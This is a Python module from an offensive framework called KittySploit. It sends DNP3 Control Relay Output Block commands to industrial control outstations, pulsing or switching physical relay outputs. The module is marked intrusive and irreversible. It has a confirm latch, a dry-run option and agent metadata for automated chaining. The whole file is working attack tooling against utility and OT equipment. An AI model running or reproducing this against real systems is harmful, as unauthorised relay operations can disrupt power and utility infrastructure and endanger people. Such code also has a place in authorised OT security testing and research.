#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.dnp3_client import operate_dnp3_crob
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.ics_session_mixin import Dnp3SessionMixin


class Module(Post, Ics_scanner_client, Dnp3SessionMixin):
    __info__ = {
        "name": "DNP3 operate CROB",
        "description": (
            "Sends a Control Relay Output Block (g12v1) via Select/Operate or Direct Operate. "
            "Intrusive — OT lab / risk_approved only (gated by ot_policy)."
        ),
        "author": "KittySploit Team",
        "tags": ["ics", "dnp3", "utilities", "control", "write"],
        "session_type": [SessionType.DNP3, SessionType.SHELL],
        "platform": Platform.MULTI,
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 2.0,
            "noise": 0.7,
            "value": 1.2,
            "requires": {"capabilities_any": ["ot_assets", "dnp3_access"]},
            "chain": {
                "produces_capabilities": [],
                "consumes_capabilities": ["dnp3_access"],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["dnp3"], "DNP3 TCP port", True)
    index = OptInteger(0, "Binary output / CROB index", True)
    control = OptInteger(0x41, "CROB control code (0x41=pulse ON)", True)
    select_before = OptBool(True, "Select before Operate (SBO); False=Direct Operate", False)
    src_address = OptInteger(1024, "Master source link address", False, advanced=True)
    dest_address = OptInteger(1, "Outstation destination", False, advanced=True)
    dry_run = OptBool(False, "Describe request only — do not send", False)
    confirm = OptBool(False, "Must be True to send (safety latch)", True)

    def check(self):
        if self._resolve_session():
            return True
        return bool(self._host())

    def run(self):
        index = int(self.index)
        control = int(self.control) & 0xFF
        select_before = bool(self.select_before)
        mode = "select_operate" if select_before else "direct_operate"

        if bool(self.dry_run):
            print_success(
                f"Dry run — would {mode} CROB index={index} control=0x{control:02x}"
            )
            return True

        if not bool(self.confirm):
            print_error("Set confirm=true to send an intrusive DNP3 operate (lab only)")
            return False

        print_warning(f"Sending DNP3 {mode} CROB index={index} control=0x{control:02x}")
        try:
            client = self.open_dnp3()
            if int(self.dest_address or 0):
                client.dest = int(self.dest_address)
            if int(self.src_address or 0):
                client.src = int(self.src_address)
            result = client.operate_crob(index, control, select_before=select_before)
        except Exception:
            host = self._host()
            if not host:
                print_error("DNP3 session or target is required")
                return False
            result = operate_dnp3_crob(
                host,
                self._port(),
                self._timeout(),
                int(self.src_address or 1024),
                int(self.dest_address or 1),
                index,
                control,
                select_before,
            )

        if result.error and not result.operate_accepted:
            print_error(result.error or "Operate failed")
            if result.select_accepted:
                print_info("SELECT was accepted but OPERATE failed")
            return False
        print_success(
            f"Operate accepted select={result.select_accepted} "
            f"operate={result.operate_accepted} mode={result.mode}"
        )
        return True
